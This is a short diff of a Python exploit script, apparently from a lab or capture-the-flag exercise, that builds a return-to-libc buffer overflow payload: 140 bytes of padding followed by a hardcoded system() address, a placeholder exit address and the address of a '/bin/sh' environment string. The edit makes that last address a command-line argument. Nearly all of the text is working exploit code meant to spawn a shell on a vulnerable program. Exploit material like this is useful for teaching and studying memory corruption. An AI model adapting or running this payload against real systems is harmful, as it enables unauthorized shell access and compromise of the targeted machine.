@@ -7,7 +7,7 @@ def x(n):
     l = '\\x' + '\\x'.join([l[i:i+2] for i in range(0, len(l), 2)])
     return l
 
-import subprocess
+import sys
 
 payload = b'A' * (140)
 system = 0xb7e6b060
@@ -16,7 +16,7 @@ payload += system
 exit_addr = 0xDEADBEEF
 exit_addr = x(exit_addr)
 payload += exit_addr
-shell_addr = 0xBFFFF99C # SHELL=/bin/[da]sh
+shell_addr = int(sys.argv[1][2:], 16) # SHELL=/bin/[da]sh
 shell_addr = x(shell_addr)
 payload += shell_addr
 
